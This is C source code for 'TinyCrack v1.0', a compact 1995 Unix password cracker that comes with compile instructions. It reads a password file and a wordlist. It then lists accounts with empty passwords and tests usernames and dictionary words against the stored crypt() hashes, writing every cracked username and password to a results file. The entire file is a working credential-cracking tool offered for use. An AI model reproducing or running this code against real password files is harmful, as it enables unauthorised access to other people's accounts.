/* TinyCrack v1.0 by Bluesman@cyberspace.org 1/95 
   If your tired of having to use gigantic password crackers for a quick-fix, 
   then you might try using this program. It does the basics. It scans for 
   nulls, tries usernames and account names and of course it runs with any 
   wordlist dictionary. TO COMPILE: gcc -O2 tc.c -o tc  
*/
#include <stdio.h> /* It's not the best, but hey, you can allmost memorize */
#include <strings.h> /* it. For greater speed, compile ufc-crypt with this */
#define fetch(a,b,c,d) { fgets(a,130,b); c=strtok(a,":"); d=strtok('\0',":");  }
main(){ FILE *p,*o,*w; char i[50]; char pes[130],pas[50],pps[50],pws[50];
char *es=pes,*as=pas,*ps=pps,*ws=pws; /* This took me a few hours to write */
printf("\nTinyCrack v1.0 Bluesman 1/95\n\n"); printf("Password File: "); 
gets(i); p=fopen(i,"r"); printf("WordList File: "); gets(i); w=fopen(i,"r");
printf("Results File : "); gets(i); o=fopen(i,"w"); /* Most time optimizing */
fprintf(o,"*** TINYCRACK v1.0 ***\n\n*** PASS 1: NULL PASSWORDS ***\n");
while(ps){ fetch(es,p,as,ps); if(ps) if(ps[-1]==':') /* I don't normally */
fprintf(o,"| User [%s] has no password!\n",as); } fflush(o); rewind(p);
fprintf(o,"*** PASS 2: ACCOUNT NAMES ***\n"); do { fetch(es,p,as,ps);
if(ps) if(!strcmp((char *)crypt(as,ps),ps)) /* write code in this format */ 
fprintf(o,"| User [%s] has password [%s]\n",as,as); } while(ps); fflush(o);
rewind(p); fprintf(o,"*** PASS 3: DICTIONARY WORDS ***\n"); do{ rewind(w);
fetch(es,p,as,ps); do{ fgets(ws,130,w); ws[strlen(ws)-1]=0; /* In case you */
if(!strcmp((char *)crypt(ws,ps),ps)){ /* were wondering. See you on the net! */ 
fprintf(o,"| User [%s] has password [%s]\n",as,ws); fflush(o); break; }} 
while(!feof(w));} while(!feof(p)); fprintf(o,"*** FINISHED SESSION ***\n"); 
exit(1)                                                                  ;}
